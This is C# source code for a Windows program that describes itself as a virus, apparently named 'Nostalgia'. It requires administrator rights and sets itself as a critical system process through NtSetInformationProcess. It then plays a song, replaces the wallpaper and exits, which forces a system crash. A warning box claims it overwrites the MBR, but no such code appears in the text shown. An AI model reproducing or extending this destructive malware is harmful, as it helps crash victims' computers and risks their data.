using System.Media;
using System.Windows.Forms;
using System.IO;
using System.Runtime.InteropServices;
using System.Drawing;
using System;
using System.Security.Principal;
using System.Diagnostics;

class ProcessHelper
{
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtSetInformationProcess(
        IntPtr hProcess,
        int processInfoClass,
        ref int processInfo,
        int processInfoLen);

    const int processBreakOnTermination = 0x1D;
    public static bool SetProcCrit(bool enable)
    {
        int isCrit = enable ? 1 : 0;
        IntPtr handle = Process.GetCurrentProcess().Handle;
        int ret = NtSetInformationProcess(handle, processBreakOnTermination, ref isCrit, sizeof(int));
        return ret == 0;
    }
}

class DesktopChanger
{
    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool SystemParametersInfo(
        int uAction, int uParam, string lpvParam, int fuWinIni);

    const int SPI_SETDESKWALLPAPER = 20;
    const int SPIF_UPDATEINIFILE = 0X01;
    const int SPIF_SENDWININICHANGE = 0x02;

    public static void ChangeWallpaper(Image img)
    {
        string temp_path = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "wallpaper.bmp");

        img.Save(temp_path, System.Drawing.Imaging.ImageFormat.Bmp);
        bool result = SystemParametersInfo(
            SPI_SETDESKWALLPAPER, 0, temp_path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);

        if (!result)
        {
            MessageBox.Show("Error!", "Error while trying to change the wallpaper.", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
    }
}
namespace WARNING
{
    class WarningHandler
    {
        public static void ShowError()
        {
            MessageBox.Show(
                "Warning! This virus will overwrite the MBR after the song in the virus ends. Use it only in VMs and never in real-machines. I do not take responsability for any wrong or malicious usage.",
                "WARNING!",
                MessageBoxButtons.OK,
                MessageBoxIcon.Warning
            );
        }
    }
}

class AudioPlayer
{
    public static void Audio()
    {
        //FROM: https://soundcloud.com/walkzz/alan-walker-force
        var stream = Nostalgia.Properties.Resources.NOSTALGIA;

        if (stream == null)
        {
            MessageBox.Show("Errore: il file audio non è stato caricato.");
            return;
        }

        SoundPlayer player = new SoundPlayer(stream);
        player.PlaySync();
    }
}

class MAIN
{
    static bool isAdmin()
    {
        var identity = WindowsIdentity.GetCurrent();
        var principal = new WindowsPrincipal(identity);
        return principal.IsInRole(WindowsBuiltInRole.Administrator);

    }
    static void run()
    {
        WARNING.WarningHandler.ShowError();
        AudioPlayer.Audio();
        DesktopChanger.ChangeWallpaper(Nostalgia.Properties.Resources.wallpaper);
        Environment.Exit(0);
    }
    static void Main()
    {
        if (!MAIN.isAdmin())
        {
            MessageBox.Show("Please, restart this application with Administrator permissions!", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Error);
            return;
        }
        else if (!ProcessHelper.SetProcCrit(true))
            {
                MessageBox.Show("Impossible to set critical process", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        else
        {
            run();
        }
    }
}
